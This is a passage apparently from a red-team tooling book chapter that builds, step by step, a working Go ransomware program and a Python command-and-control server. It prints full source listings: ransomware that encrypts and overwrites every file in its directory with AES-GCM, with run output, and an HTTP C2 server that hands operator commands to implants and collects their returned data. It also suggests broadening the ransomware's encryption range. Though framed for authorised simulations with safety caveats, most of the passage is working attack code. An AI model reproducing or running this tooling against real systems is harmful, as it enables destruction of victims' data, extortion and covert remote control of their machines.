    ciphertext := gcm.Seal(nil, nonce, plaintext, nil)
    return append(nonce, ciphertext...), nil
}
The primary difference from encrypt.go is that in this code you’re removing the need for the GenerateRandomBytes() function. Instead, you use the gcm object (formerly the variable aesgcm) and call its very helpful NonceSize() function. Because you’re defining your block as a new AES cipher using a 32-byte key and then using that block to generate your gcm object, the cryptographic library already knows that you’re working with an AES-GCM cipher and that you need a 12-byte IV. Calling gcm.NonceSize() effectively does the same thing as your old GenerateRandomBytes() helper function without requiring you to specify any length values. You do, however, pass it into the rand.Read() function just as you did before to randomize the slice a bit to ensure it is unique.

Likewise, your Decrypt() function will perform almost exactly the same as decrypt.go:

// Decrypt decrypts the given ciphertext by using AES-GCM.
func Decrypt(ciphertext []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }

    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }

    nonceSize := gcm.NonceSize()
    if len(ciphertext) < nonceSize {
        return nil, fmt.Errorf("ciphertext too short")
    }
The main difference here is the first of a few safety checks you’ll implement in your ransomware utility. This check validates that the file you’re decrypting can be decrypted based on the data you’re expecting, versus what it contains. You’re also creating your gcm object the same way, which allows you to access the gcm.NonceSize() function again. This time, you store it in the variable nonceSize to use for one of these sanity checks. This check simply verifies that the length of the ciphertext you’re reading isn’t less than the size of the IV value. If for some reason your ciphertext length is shorter, you know that either you didn’t encrypt it or the data is corrupted.

Next, you slice apart the data, skipping bytes to extract the IV and the ciphertext data just as before:

    nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
    plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
    if err != nil {
        return nil, err
    }

    return plaintext, nil
}
You’re using the nonceSize variable this time instead of the static 12 for the length. You’re also using a unique assignment method that Go supports: assigning two comma-separated values to two comma-separated variables, all on one line. You’ve been doing this all along to handle a variable assignment with an error assignment. Those functions returned two distinct values that you assigned to two distinct variables, all on one line. This example just showcases how you can do this in the context of a normal assignment as well. Beyond that, the code is exactly the same as decrypt.go from earlier in the chapter.

Scaffolding the Ransomware Logic
Next, you’ll scaffold out the functions you need for your ransomware logic:

// writeToFile writes content to a temporary file and atomically overwrites the original file.
func writeToFile(filename string, content []byte) error {

}

func doEncrypt(currentDir string, key []byte) {

}

func doDecrypt(currentDir string, key []byte) {

}

func main() {

}
First is a helper function called writeToFile(), which does exactly what its name indicates. What’s unique, however, is that it writes the data to a file atomically, meaning it writes the data to a temporary file first, then moves that file to overwrite the original. While not entirely necessary, atomic file writing helps avoid the potential for data corruption if two programs try to write to a file at the same time, since the temp file is an altogether separate file that replaces rather than writes to the original.

NOTE
You may not want to overwrite or delete any files from the target system in your ransomware OST. I can’t overstate that this is a potentially dangerous activity, and implementing this atomic file write may not be appropriate in a real-world engagement. It may be just as effective to skip the last file rename/overwrite step entirely and write only new temp files as a proof of concept. As always, defer to your rules of engagement and client requests, and handle their data carefully.

Next are the doEncrypt() and doDecrypt() functions, which implement the primary ransomware logic and call your new writeToFile() helper function, along with your Encrypt() and Decrypt() functions, respectively.

Finally, of course, is the main() entry-point function:

func main() {
    // Key should be kept secure in a real-world scenario.
    key := []byte("01234567890123456789012345678901")

    // Get the current directory.
    currentDir, err := os.Getwd()

    if err != nil {
        fmt.Println("Error getting current directory:", err)
        return
    }

    doEncrypt(currentDir, key)
    doDecrypt(currentDir, key)
}
The main() function contains your encryption key and handles a few extra setup calls prior to executing your ransomware functions. First, main() uses the os library to get the current working directory so that your ransomware will encrypt and decrypt only files that are in the same directory as the program itself (and won’t arbitrarily encrypt other files and file locations you don’t want it to). You’re also adding a check to avoid subdirectories of your current directory, putting that logic inside your doEncrypt() and doDecrypt() functions. If main() can’t get the current directory, it throws an error and returns; if it can, it calls your ransomware functions. This ensures that the ransomware tool will exit gracefully if it can’t determine its location and prevents accidental file encryption.

Now you’ll move on to the body of the writeToFile() function:

// writeToFile writes content to a temporary file and atomically overwrites the original file.
func writeToFile(filename string, content []byte) error {
    tmpFilePath := filename + ".tmp"

    // Write content to a temporary file.
    err := ioutil.WriteFile(tmpFilePath, content, 0644)
    if err != nil {
        return err
    }
    // Atomically replace the original file with the temporary file.
    return os.Rename(tmpFilePath, filename)
}
This function is quite simple. You start by defining a temporary filepath that consists of a filename you provide and the extension .tmp. After that, writeToFile() writes the file. If no errors occur during the file write, the function calls os.Rename() to overwrite the original file with the new temp one. If an error returns, it will travel up the execution stack to the doEncrypt() and doDecrypt() functions, which will handle it when they call the writeToFile() function.

Defining the doEncrypt() and doDecrypt() Functions
With all your pieces now in place, you can flesh out the doEncrypt() function:

func doEncrypt(currentDir string, key []byte) {

    // Encrypt all files in the current directory.
    err := filepath.Walk(currentDir, func(path string, info os.FileInfo, err error)
    error {

        if err != nil {
            return err
        }

        // Skip subdirectories.
        if info.IsDir() {
            return nil
        }
This function starts by calling the new filepath.Walk() library function, which takes in the current working directory defined in main() and walks through it, collecting various details via a function literal. A function literal in Go is exactly the same thing as an anonymous function in JavaScript: a function that executes in its own context and has no name. In this case, it is executing as a parameter of the filepath.Walk() function call and serves as a loop that will handle logic for each file returned from the current working directory.

The doEncrypt() function is where a lot of the aforementioned “sanity check” logic starts to occur. The first simply checks that no errors are returned when you attempt to work with a given file. If no errors are returned, the next check determines whether the given file is a directory instead of a file by calling info.IsDir(). If it is, execution stops and moves to the next file.

The next check makes sure your source code or your program binary doesn’t get encrypted (this would be very bad, as all your hard work would be overwritten, including the decryption function that could have recovered everything!):

        // Skip the program itself.
        if info.Name() == "ransomware" || info.Name() == "ransomware.go" {
            return nil
        }

        // Read the file content.
        fileContent, err := ioutil.ReadFile(path)
        if err != nil {
            return err
        }

        // Encrypt the file content.
        encryptedContent, err := Encrypt(fileContent, key)
        if err != nil {
            return err
        }
This code checks the name of the current file, and if it matches a file you want to ignore, the check returns and moves to the next file. You could use this same logic to ignore other filenames, or even file types and extensions, by using regular expressions if you wanted to. This completes the safety checks, so you then read your target content and pass it along to the Encrypt() function.

Once you have the encrypted data, you’re ready to overwrite the original file with your new encrypted file:

        // Write the encrypted content to the file atomically.
        err = writeToFile(path, encryptedContent)
        if err != nil {
            return err
        }

        fmt.Printf("File '%s' encrypted and overwritten successfully.\n", path)
        return nil
    })
You pass your filepath and the encrypted content to the writeToFile() function, and you’re done. The print statement confirms that the operation for a given file was successful, and the filepath walk-through continues to the next file and repeats all these steps until all files in the path have been checked.

The last step is to handle the error that gets passed up if there was any trouble encrypting the files, and if not, print the aforementioned message indicating that the file encryption process succeeded:

    if err != nil {
        fmt.Println("Error encrypting files:", err)
        return
    }

    fmt.Println("All files encrypted and overwritten successfully.")
}
That was quite a bit of code, but fortunately your doDecrypt() function will get to reuse a vast majority of it. The only real difference between doEncrypt() and doDecrypt() is the call to the underlying Encrypt() and Decrypt() functions, respectively, so feel free to copy and paste code as appropriate to speed up your development process.

You’ll kick off doDecrypt() the same way with your filepath.Walk() function call to iterate through the current working directory:

func doDecrypt(currentDir string, key []byte) {
    // Decrypt all files in the current directory.
    err := filepath.Walk(currentDir, func(path string, info os.FileInfo, err error)
    error {

        if err != nil {
            return err
        }

        // Skip subdirectories.
        if info.IsDir() {
            return nil
        }

        // Skip the program itself.
        if info.Name() == "ransomware" || info.Name() == "ransomware.go" {
            return nil
        }

        // Read the encrypted file content.
        encryptedFileContent, err := ioutil.ReadFile(path)
        if err != nil {
            return err
        }
This code includes all the same safety checks: checking for errors, subdirectories, and then for specifically named items to avoid, such as your program and its code.

This time, though, you read the encrypted files because you are decrypting them in this function:

        // Decrypt the file content.
        decryptedContent, err := Decrypt(encryptedFileContent, key)
        if err != nil {
            return err
        }
Once the file is read, you can call the Decrypt() function, passing in the contents and the key just as you did for Encrypt():

        // Overwrite the file atomically with the decrypted content.
        err = writeToFile(path, decryptedContent)
        if err != nil {
            return err
        }

        fmt.Printf("File '%s' decrypted and overwritten successfully.\n", path)
        return nil
    })
Next you call writeToFile() once again, this time to restore the decrypted original files while printing the status for each file as you go:

    if err != nil {
        fmt.Println("Error decrypting files:", err)
        return
    }
    fmt.Println("All files decrypted and overwritten successfully.")
}
Then you wrap it all up with the same error check and a similar message confirming that the file decryption was successful if no errors occurred.

The final ransomware.go file is shown in Listing 3-7.

package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "fmt"
    "io/ioutil"
    "os"
    "path/filepath"
)

// Encrypt encrypts the given plaintext with AES-GCM.
func Encrypt(plaintext []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }

    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }

    nonce := make([]byte, gcm.NonceSize())
    if _, err := rand.Read(nonce); err != nil {
        return nil, err
    }

    ciphertext := gcm.Seal(nil, nonce, plaintext, nil)
    return append(nonce, ciphertext...), nil
}

// Decrypt decrypts the given ciphertext with AES-GCM.
func Decrypt(ciphertext []byte, key []byte) ([]byte, error) {
    block, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }

    gcm, err := cipher.NewGCM(block)
    if err != nil {
        return nil, err
    }

    nonceSize := gcm.NonceSize()
    if len(ciphertext) < nonceSize {
        return nil, fmt.Errorf("ciphertext too short")
    }

    nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
    plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
    if err != nil {
        return nil, err
    }

    return plaintext, nil
}

// writeToFile writes content to a temporary file and atomically overwrites the original file.
func writeToFile(filename string, content []byte) error {
    tmpFilePath := filename + ".tmp"

    // Write content to a temporary file.
    err := ioutil.WriteFile(tmpFilePath, content, 0644)
    if err != nil {
        return err
    }

    // Atomically replace the original file with the temporary file.
    return os.Rename(tmpFilePath, filename)
}

func doEncrypt(currentDir string, key []byte) {

    // Encrypt all files in the current directory.
    err := filepath.Walk(currentDir, func(path string, info os.FileInfo, err error)
    error {
                        

        if err != nil {
            return err
        }

        // Skip directories.
        if info.IsDir() {
            return nil
        }

        // Skip the program itself.
        if info.Name() == "ransomware" || info.Name() == "ransomware.go" {
            return nil
        }

        // Read the file content.
        fileContent, err := ioutil.ReadFile(path)
        if err != nil {
            return err
        }

        // Encrypt the file content.
        encryptedContent, err := Encrypt(fileContent, key)
        if err != nil {
            return err
        }

        // Write the encrypted content to the file atomically.
        err = writeToFile(path, encryptedContent)
        if err != nil {
            return err
        }

        fmt.Printf("File '%s' encrypted and overwritten successfully.\n", path)
        return nil

    })

    if err != nil {
        fmt.Println("Error encrypting files:", err)
        return
    }

    fmt.Println("All files encrypted and overwritten successfully.")

}

func doDecrypt(currentDir string, key []byte) {
    // Decrypt all files in the current directory.
    err := filepath.Walk(currentDir, func(path string, info os.FileInfo, err error)
    error {
        if err != nil {
            return err
        }

        // Skip subdirectories.
        if info.IsDir() {
            return nil
        }

        // Skip the program itself.
        if info.Name() == "ransomware" || info.Name() == "ransomware.go" {
            return nil
        }

        // Read the encrypted file content.
        encryptedFileContent, err := ioutil.ReadFile(path)
        if err != nil {
            return err
        }

        // Decrypt the file content.
        decryptedContent, err := Decrypt(encryptedFileContent, key)
        if err != nil {
            return err
        }

        // Overwrite the file atomically with the decrypted content.
        err = writeToFile(path, decryptedContent)
        if err != nil {
            return err
        }

        fmt.Printf("File '%s' decrypted and overwritten successfully.\n", path)
        return nil

    })

    if err != nil {
        fmt.Println("Error decrypting files:", err)
        return
    }
    fmt.Println("All files decrypted and overwritten successfully.")

}

func main() {
    // Key should be kept secure in a real-world scenario.
    key := []byte("01234567890123456789012345678901")

    // Get the current directory.
    currentDir, err := os.Getwd()

    if err != nil {
        fmt.Println("Error getting current directory:", err)
        return
    }

    doEncrypt(currentDir, key)
    doDecrypt(currentDir, key)
}
Listing 3-7: The complete Go ransomware program

Running the Ransomware Program
Now drop into the command line and run your new tool:

$ go run ransomware.go
File '/home/ubuntudev/Documents/OST_Course/Binary_Toolkits/Ransomware/new_data.txt'
    encrypted and overwritten successfully
All files encrypted and overwritten successfully.
File '/home/ubuntudev/Documents/OST_Course/Binary_Toolkits/Ransomware/new_data.txt'
    decrypted and overwritten successfully
All files decrypted and overwritten successfully.
In the output, you should see that the program quickly encrypts and then decrypts the files.

This is great, as it lets you know the program is running successfully, but it’s not all that helpful in showing you how it really functions because you’re immediately decrypting the files right after the encryption call. The data is essentially restored to normal as soon as it has been encrypted, making it seem like nothing has happened at all. To isolate one function and observe it in its own runtime, simply comment out the one you don’t want to use. Back in your main() function, comment out the doDecrypt() function like so:

    // doDecrypt(currentDir, key)
Then try running the program again to see the encryption step in isolation:

$ go run ransomware.go
File '/home/ubuntudev/Documents/OST_Course/Binary_Toolkits/Ransomware/new_data.txt'
      encrypted and overwritten successfully
All files encrypted and overwritten successfully.
After commenting out doDecrypt() and running the program again, you should see the message All files encrypted and overwritten successfully at the end of your console output. Open the new_data.txt file to confirm that it is, in fact, fully encrypted.

Now try doing the inverse. Comment out doEncrypt() to isolate the decryption step, then run the program again see the data successfully restored back to its original state:

$ go run ransomware.go
File '/home/ubuntudev/Documents/OST_Course/Binary_Toolkits/Ransomware/new_data.txt'
      decrypted and overwritten successfully
All files decrypted and overwritten successfully.
$ cat new_data.txt
some new data
Just like that, you have your very own ransomware utility that you can add to your OST tool kit. This tool will allow you to generate a cross-platform binary that can be deployed on virtually any target operating system in a ransomware simulation. Again, be mindful of the potential to accidentally overwrite files, and exercise caution in a professional setting. Otherwise, this OST is complete and ready to be used in a real-world engagement. It offers more than enough baseline functionality to extend for other use cases with a few extra lines of code—for example, to add more checks to encrypt only certain file types, or to broaden the encryption range to other parts of the system.

Writing a C2 Server in Python
Before you can create a C2 implant, you need a server for it to talk to. To implement this C2 server, you’ll be switching back to Python for a moment. With an implant, you want an easily distributable package that can run on your target system, which is why Go is a great language choice, but server portability is far less important for the C2. You fully control the server—it’s your infrastructure—so you can write the C2 server in any language you want without fear of missing libraries or dependencies. I chose Python for this example because your C2 server is just an HTTP server, and as you saw in Chapter 2 when developing your custom proxy, using Python to make HTTP servers is incredibly simple.

Open a new file and save it as c2_server.py (skip ahead to Listing 3-8 to see the full code). As with all the code you’ve written so far, you start by defining the libraries to import:

import logging
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
import urllib.parse
The logging library enables you to access various methods related to HTTP server logging so that you can change the log level to be a little cleaner. The http.server library will be the core of your server, utilizing the SimpleHTTPRequestHandler and HTTPServer classes from its code. The threading library gives you support for multithreading so you can handle multiple HTTP connections. Finally, urllib.parse allows you to parse your data from the GET connections you’ll receive.

CAVEATS ABOUT IMPLEMENTATION AND SCOPE
The baseline goal for this exercise is creating a simple functional C2 server that can issue commands and receive their output—nothing more, nothing less. Although you’ll be implementing multithreading, your C2 server won’t be handling multiple sessions at once, at least not cleanly. By the end of this implementation, you’ll have a functioning C2 server that can receive connections from multiple implants, but you won’t have any code to track those implants or assign specific commands to execute. This means if more than one implant connects to your C2 server at the same time, they will be in a race condition to see which command executes first.

Additionally, you’ll be working only with GET requests, which limit the number of characters that can be stored in a URI; this limit is usually fine for standard output but can quickly be exceeded in large file transfers. Implementing multiple sessions and POST requests (or new handlers for protocols like raw TCP and even UDP) are left as challenges for you to further improve this server on your own.

You’ll implement this program a little differently. Instead of scaffolding out the functions you’ll need later, you’ll fully implement your main function now and have it reference what you’ll need to build as you go:

if __name__ == '__main__':
    try:
        # Specify the port (for example, 8000).
        port = 9001
        server_address = ('', port)
        user_input = ''

        # Create an HTTP server with the custom request handler.
        httpd = HTTPServer(server_address, MyRequestHandler)

        # Start the server in a separate thread.
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.start()

        # Start the user input loop.
        get_user_input()

        # Stop the server when the user input loop is exited.
        httpd.shutdown()
        httpd.server_close()

        print("Server stopped.")
    except KeyboardInterrupt:
        # Handle Ctrl-C to stop the server.
        httpd.shutdown()
        httpd.server_close()
        print("\nServer stopped.")
First, wrap the body of the main function with a try...catch statement. The exception you’ll catch in this case isn’t related to programmatic error handling, but rather to user input handling. This exception will trigger on a KeyboardInterrupt, or in other words, when a user presses CTRL-C. This will allow your tool to gracefully exit when it receives this key combination, instead of abruptly shutting down the threads (the default behavior) and risking corrupting them.

Next, define a few variables specific to your C2 server. The first is the port your server will listen on. For this example, it’s set to 9001, but in the real world you might want to set it to 80 or 443 to mimic a real web server. Then define the server_address variable as a tuple. The first value of the tuple is normally the listening IP address, but since you want your server listing on all available interfaces, you leave this blank. The second tuple value is the port.

Now that you have your prerequisite values, you can create a new HTTPServer object. This object will take in your server_address variable and a reference to a MyRequestHandler class you’ll be creating. This class will tell your custom HTTPServer object how it should handle requests. You store all this into a variable called httpd.

You want to start your server and have it essentially run in the background and handle requests. This is because the main user interaction for this C2 server is via a read–evaluate–print loop, or REPL. While your server handles requests on a separate thread, the REPL will continue to prompt for input and process data received from the HTTP server to display in the console. Multithreading in Python is as simple as calling threading.Thread() and passing in the httpd.server_forever function call reference as the target parameter. Then you can start the thread by using server_thread.start(), and your HTTP server will spin up, listening on the host and port you specified.

Following the thread execution, you need to start the REPL. All this logic will be handled in a function called get_user_input(), which will loop indefinitely until you exit, prompting for input as it goes. For now, you just need your main function to call it. If your REPL ever ends and returns to the main function, the httpd server process will be shut down and closed, and a message will be printed to indicate that the server has stopped.

Building your REPL takes only a few lines of code in the get_user_input() function definition:

def get_user_input():
    global user_input
    while True:
        user_input = input("Command (type 'exit' to stop) > ")
        if user_input.lower() == 'exit':
            break
The first line establishes the user_input variable as a global value that you can reference. After defining this reference, you begin an infinite loop. On each iteration, the user_input variable will be set to whatever you type into the prompt. The input prompt will display a helpful message confirming that the program is ready to receive a command, and that you can type exit to stop. The line that immediately follows this input() call checks whether the lowercase version of the user input matches exit, meaning the capitalization for the user input doesn’t matter. If a match exists, you cleanly break from the loop, allowing get_user_input() to finish execution and returning to the main function to gracefully shut down your HTTP server.

Now you’re ready to build the brains of your C2 server—your custom HTTP request-handling class called MyRequestHandler():

class MyRequestHandler(NoLogRequestHandler):
    def do_GET(self):
        global user_input
        # Parse the "data" parameter from the URI.
        query_params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        data_param = query_params.get('data', [''])[0]

        # Print the entered command and the received "data" parameter.
        if data_param != "":
            print(f"\nData parameter received: {data_param}")


        # Send the user input as the response.
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
The MyRequestHandler() class has a parameter of NoLogRequestHandler. Following that, you override the GET request method and define your global variable reference for user_input.

NOTE
Later you’ll override NoLogRequestHandler to remove logging from your HTTP server; otherwise, you’ll get a message about every basic detail of every web request that comes in, rather than just the command input and output that you expect. Logging can be great for debugging, and you may want to leave it on as you develop. When operating the C2 server, however, you don’t want to clutter your operational command line with details you don’t need.

Next, use the urllib.parse library to extract the URI path of the GET request that is sent. You’ll use that extracted data to query for a specific parameter—in this case, to get data from the data GET parameter. Once you’ve extracted the data, you check whether the query parameter value is empty. If not, you print the data you received; if so, you move on and do nothing.

Finally, send back a typical web server response:

        self.wfile.write(bytes(user_input, 'utf-8'))

        # Clear the user input after serving the page.
        user_input = ''
If any value is stored in the user_input variable that you supply, that value will be written via your old friend wfile.write() as a simple plaintext web page containing the command you provide as input. The implant will scrape the command from the page and execute it. If the user_input value is empty, the page will be blank with a 200 response code to let your implant know that the request was successful, but there’s nothing for it to execute. Finally, you reset user_input to be sure it’s empty. Because you’re in a loop, if you don’t reset user_input, it will always remain set to the last thing you typed. This means if you typed ls, your implant would infinitely run ls and return the output of that command until you type in a new command. By clearing user_input when you’re done, you ensure that the command runs only once.

The last step is to configure that log handler to reduce the verbosity of your HTTP server logs. Place the following code directly after the last import statement at the top of your file:

# Disable all logs from http.server.
class NoLogRequestHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

# Configure logging to print only errors.
logging.basicConfig(level=logging.ERROR)
Before running your program, check it against the complete c2_server.py code shown in Listing 3-8.

import logging
from http.server import SimpleHTTPRequestHandler, HTTPServer
import threading
import urllib.parse

# Disable all logs from http.server.
class NoLogRequestHandler(SimpleHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

# Configure logging to print only errors.
logging.basicConfig(level=logging.ERROR)

class MyRequestHandler(NoLogRequestHandler):
    def do_GET(self):
        global user_input
        # Parse the "data" parameter from the URI.
        query_params = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
        data_param = query_params.get('data', [''])[0]

        # Print the entered command and the received "data" parameter.
        if data_param != "":
            print(f"\nData parameter received: {data_param}")

       
        # Send the user input as the response.
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(bytes(user_input, 'utf-8'))

        # Clear the user input after serving the page.
        user_input = ''

def get_user_input():
    global user_input
    while True:
        user_input = input("Command (type 'exit' to stop) > ")
        if user_input.lower() == 'exit':
            break


if __name__ == '__main__':
    try:
        # Specify the port (for example, 8000).
        port = 9001
        server_address = ('', port)
        user_input = ''

        # Create an HTTP server with the custom request handler.
        httpd = HTTPServer(server_address, MyRequestHandler)

        # Start the server in a separate thread.
        server_thread = threading.Thread(target=httpd.serve_forever)
        server_thread.start()

        # Start the user input loop.
        get_user_input()

        # Stop the server when the user input loop is exited.
        httpd.shutdown()
        httpd.server_close()

        print("Server stopped.")
    except KeyboardInterrupt:
        # Handle Ctrl-C to stop the server.
        httpd.shutdown()
        httpd.server_close()
        print("\nServer stopped.")
Listing 3-8: The complete Python C2 server program

Now you’re ready to test it out. While you don’t have an implant just yet, you can visit your C2 server on port 9001 in a web browser to see whether it behaves as you expect. Start the C2 server with Python as follows:

$ python3 c2_server.py
Command (type 'exit' to stop) >
When prompted with the REPL you created, enter whoami and then visit the page in a browser. You should see the command displayed on the page, as shown in Figure 3-1.

A web browser visiting the page localhost colon 9001and displaying the text response whoami.
Figure 3-1: The C2 server view from a web browser displaying the issued command

If you refresh the page, you should see that the data was cleared. No further text will appear onscreen until you type a new command for the REPL to process and feed to the HTTP server.

You can also verify that your programmatic exit checks are working and will gracefully shut down the server. If the REPL receives a CTRL-C input or you type exit, you get a Server stopped message just as you expect:

$ python3 c2_server.py
Command (type 'exit' to stop) > whoami
Command (type 'exit' to stop) > ^C
Server stopped.
$ python3 c2_server.py
Command (type 'exit' to stop) > exit
Server stopped.
Your custom C2 server is complete. It may lack the conveniences of graceful multisession handling, autocomplete, and other typical features of tools like Metasploit, Sliver, and Lupo, but you can always implement those yourself now that you know how to program! What your server can do well is execute commands and receive data, so all you need now is an implant to use with it.

Writing a C2 Implant
For your implant program, you’ll be switching back to Go for its cross-platform portability, although you can absolutely implement this in any language you choose. Once you write this implant, you’ll be able to compile it for almost every type of system you’d want to target; technically, it can even run on a mobile phone.

Before you start writing code, however, it is important to understand the algorithm of a C2 implant, or as I like to call it, the execution loop. A C2 program’s execution loop is universal: Even if you’re using a direct connection instead of a literal separate request loop, you’re at least logically stepping through this loop. You can read more about this topic in the Lupo C2 server documentation (https://github.com/InjectionSoftwareandSecurityLLC/lupo/blob/main/docs/server/api.md), but the basic loop is represented by the following pseudocode:

WHILE:

    IF OUTPUT_DATA:
        SEND_DATA(OUTPUT_DATA)

    CMD = GET_NEXT_CMD()

    IF CMD:
        PROCESS_CMD(CMD)
Full-featured servers like Lupo C2 also have additional logic for registering their implants and handling persistence while tracking sessions. By default, your C2 server isn’t capable of all that, so you’re concerned only with the core execution loop, which checks whether there’s any data to send to the C2 server.
